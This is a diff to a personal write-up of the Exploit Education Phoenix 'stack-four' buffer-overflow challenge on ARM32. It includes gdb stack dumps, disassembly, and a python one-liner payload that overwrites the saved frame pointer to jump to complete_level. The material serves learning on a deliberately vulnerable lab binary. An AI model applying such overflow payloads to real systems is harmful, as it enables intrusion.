@@ -7,7 +7,9 @@
 ##### Learning
 Reading the `registers` when the app crashed [ with a `segmentation fault` ] revealed clues.  To get the crash you passed in a large string that caused the `buffer overflow`.  The overflow was possible as the app used the C `gets` API to gather user input.
 
-I used the clues from the crash to place a breakpoint that showed how the `Function Pointer ($fp)` could be overwritten to alter the `Code path`.  The `$fp` was named the `r11` register on ARM 32 bit device.
+I used the clues from the crash to place a breakpoint that showed how the `Frame Pointer ($fp)` could be overwritten to alter the `Code path`.  The `$fp` was named the `r11` register on ARM 32 bit device.
+
+If the payload was too large, it would overwrite the `Program Counter ($pc)` the overflow would fail with `[!] Cannot disassemble from $PC`.
 
 After finding the answer I found better answers to the challenge.  This one https://blog.lamarranet.com/index.php/exploit-education-phoenix-stack-four-solution/ is excellent.  
 
@@ -35,20 +37,6 @@ $2 = 0xfffefd74
 ```
 Then you could find out the bytes in the Stack you needed to overwrite.
 ```
-gef> x/24x $sp
-0xfffefd20:	0xfffefd5f	0x00414141	0x00000000	0xf77eee40
-0xfffefd30:	0x00010640	0x00000000	0x00000036	0x00000000
-0xfffefd40:	0x00000000	0xf7799c04	0x00500018	0x00000000
-0xfffefd50:	0x0001059c	0xf7799894	0xf77eee40	0x0a00000a
-0xfffefd60:	0xf77eee40	0x000105bc	0xfffefdbc	0xfffefdbc
-0xfffefd70:	0xfffefd84	0x000105bc	0xfffefdb4	0x00000001
-gef> find $sp, +96,0x000105bc
-0xfffefd64
-0xfffefd74
-2 patterns found.
-gef> p/x $fp
-$5 = 0xfffefd74
-
 gef> p 0xfffefd74 - 0xfffefd20
 $6 = 0x54
 
@@ -218,8 +206,8 @@ $ python -c 'print "A"*(76) + "\x44\x05\x01\x00"' | ./stack-four
 ```
 Failed.
 ##### Answer
+Breakpoint on the `segfault` at offset `0x0001058c` in `start_level`.
 ```
-Breakpoint on: #0  0x0001058c in start_level ()
 // Normal flow, no overflow 4 x As
 gef> x $fp
 0xfffefd74:	0x000105bc
@@ -239,9 +227,9 @@ It was trying to move back from the `start_Level` function to the `main` functio
 |           0x000105bc      0030a0e3       mov r3, 0              <-- code is moving back here
 |           0x000105c0      0300a0e1       mov r0, r3
 |           0x000105c4      04d04be2       sub sp, fp, 4
-\           0x000105c8      0088bde8       pop {fp, pc}
+\           0x000105c8      0088bde8       pop {fp, pc}           <-- end of program
 ```
-This was a perfect place to place the memory address I want to skip toward; the `complete_level` address.
+This was the address to modify.  I would change from `0x000105bc` (back to the Main function) to `0x00010544`; the `complete_level` address.
 ```
 // Overflowed with 80 x As
 gef> x $fp
@@ -250,7 +238,11 @@ $r11 : 0x41414141
 ```
 Now we control the `$fp` register (`r11`).
 ```
+// Bash
 $ python -c 'print "A"*(80) + "\x44\x05\x01\x00"' | ./stack-four
+
+// inside gdb
+gef> r <<< $(python -c 'print "A"*80 + "\x44\x05\x01\x00"')
 
 Welcome to phoenix/stack-four, brought to you by https://exploit.education
 and will be returning to 0x105bc
